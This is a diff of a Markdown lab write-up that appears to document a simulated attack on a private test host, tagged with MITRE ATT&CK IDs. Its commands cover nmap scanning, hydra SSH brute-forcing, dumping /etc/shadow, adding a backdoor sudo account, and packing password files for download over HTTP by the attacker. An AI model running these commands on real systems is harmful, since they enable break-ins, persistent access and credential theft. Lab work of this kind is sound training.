@@ -18,19 +18,19 @@ nmap -sV -sC -O 172.16.207.4
 
 **Result:** Discovered Apache 2.4.58 on port 80, SSH on port 22, Linux OS fingerprint.
 
-![Nmap Scan](01_nmap_recon.png)
+![Nmap Scan](screenshots/01_nmap_recon.png)
+
 ---
 
 ## Step 2 — Brute-Force SSH (T1110.001)
 
 ```bash
-echo -e "password\n123456\nadmin123\nroot123\npassword123" > passwords.txt
 hydra -l admin -P passwords.txt ssh://172.16.207.4 -t 4 -V
 ```
 
 **Result:** Cracked `admin:admin123` in 2 seconds on 3rd attempt.
 
-![Hydra Brute-Force](02_hydra_bruteforce.png)
+![Hydra Brute-Force](screenshots/02_hydra_bruteforce.png)
 
 ---
 
@@ -43,7 +43,7 @@ whoami && hostname && id
 
 **Result:** Shell obtained as admin (uid=1001), member of sudo group.
 
-![SSH Access](03_ssh_initial_access.png)
+![SSH Access](screenshots/03_ssh_initial_access.png)
 
 ---
 
@@ -57,7 +57,7 @@ cat /etc/shadow
 
 **Result:** Root access via passwordless sudo. /etc/shadow dumped revealing all password hashes.
 
-![Privilege Escalation](04_privilege_escalation.png)
+![Privilege Escalation](screenshots/04_privilege_escalation.png)
 
 ---
 
@@ -68,34 +68,26 @@ useradd -m -s /bin/bash backdoor
 echo "backdoor:backdoor123" | chpasswd
 usermod -aG sudo backdoor
 echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
-cat /etc/passwd | grep backdoor
 ```
 
 **Result:** Backdoor account created (uid=1002) with full sudo privileges.
 
-![Backdoor Creation](05_backdoor_persistence.png)
+![Backdoor Creation](screenshots/05_backdoor_persistence.png)
 
 ---
 
 ## Step 6 — Data Exfiltration (T1048)
 
 ```bash
-mkdir /tmp/exfil
-cp /etc/passwd /etc/shadow /tmp/exfil/
-echo "DB_PASSWORD=supersecret123" > /tmp/exfil/credentials.txt
 tar -czf /tmp/stolen_data.tar.gz /tmp/exfil/
-cd /tmp && python3 -m http.server 8888 &
-```
-
-On Kali (attacker):
-```bash
+python3 -m http.server 8888 &
 wget http://172.16.207.4:8888/stolen_data.tar.gz
 ```
 
 **Result:** 1364 bytes of sensitive data exfiltrated via HTTP.
 
-![Exfil Server](06_exfiltration_server.png)
-![Exfil Download](07_exfiltration_download.png)
+![Exfil Server](screenshots/06_exfiltration_server.png)
+![Exfil Download](screenshots/07_exfiltration_download.png)
 
 ---
 
